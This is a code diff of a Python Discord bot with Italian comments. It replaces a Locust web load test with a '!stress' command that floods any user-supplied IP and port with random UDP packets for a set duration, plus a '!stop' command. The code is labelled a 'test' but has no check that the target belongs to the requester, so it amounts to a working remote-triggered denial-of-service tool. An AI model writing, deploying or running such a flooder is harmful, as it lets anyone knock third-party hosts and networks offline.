@@ -1,53 +1,53 @@
-import os
 import discord
-import subprocess
+from discord.ext import commands
+import socket
+import os
+import asyncio
 import threading
-from flask import Flask
-from locust import HttpUser, task
 
-# -------- TOKEN DALLE VARIABILI D'AMBIENTE --------
-TOKEN = os.environ.get("DISCORD_TOKEN")
-if not TOKEN:
-    raise ValueError("Devi impostare la variabile d'ambiente DISCORD_TOKEN su Render!")
+# Configuriamo il bot
+intents = discord.Intents.default()
+intents.message_content = True
+bot = commands.Bot(command_prefix="!", intents=intents)
 
-# -------- LOCUST TEST --------
-class SiteUser(HttpUser):
+# Variabile per gestire l'interruzione dei test
+active_tests = {}
 
-    @task
-    def index(self):
-        self.client.get("/")
+async def udp_flood(ip, port, duration, test_id):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes_packet = os.urandom(1024) # Pacchetto da 1KB
+    timeout = asyncio.get_event_loop().time() + duration
+    
+    while asyncio.get_event_loop().time() < timeout:
+        if not active_tests.get(test_id, True):
+            break
+        client.sendto(bytes_packet, (ip, port))
+        await asyncio.sleep(0) # Permette al bot di non bloccarsi
 
-# -------- DISCORD BOT --------
-bot = discord.Bot()
+@bot.command()
+async def stress(ctx, ip: str, port: int, duration: int = 60):
+    test_id = f"{ip}:{port}"
+    active_tests[test_id] = True
+    
+    await ctx.send(f"🚀 Test avviato su **{ip}:{port}** per {duration} secondi.")
+    
+    try:
+        await asyncio.wait_for(udp_flood(ip, port, duration, test_id), timeout=duration+5)
+    except asyncio.TimeoutError:
+        pass
+    
+    active_tests.pop(test_id, None)
+    await ctx.send(f"✅ Test su {ip} terminato.")
 
-@bot.slash_command(name="test", description="Avvia test sul sito")
-async def test(ctx, url: str):
+@bot.command()
+async def stop(ctx, ip: str, port: int):
+    test_id = f"{ip}:{port}"
+    if test_id in active_tests:
+        active_tests[test_id] = False
+        await ctx.send(f"🛑 Test su {test_id} interrotto manualmente.")
+    else:
+        await ctx.send("Non ci sono test attivi su quell'indirizzo.")
 
-    await ctx.respond("Test avviato...")
-
-    subprocess.run([
-        "locust",
-        "-f", "bot.py",
-        "--headless",
-        "-u", "20",
-        "-r", "5",
-        "-t", "20s",
-        "-H", url
-    ])
-
-    await ctx.followup.send("Test completato")
-
-# -------- SERVER WEB PER UPTIMEROBOT --------
-app = Flask(__name__)
-
-@app.route("/")
-def home():
-    return "Bot attivo"
-
-def run_web():
-    app.run(host="0.0.0.0", port=10000)
-
-threading.Thread(target=run_web).start()
-
-# -------- START BOT --------
-bot.run(TOKEN)
+# Recupera il token dalle variabili d'ambiente di Render
+token = os.getenv("DISCORD_TOKEN")
+bot.run(token)
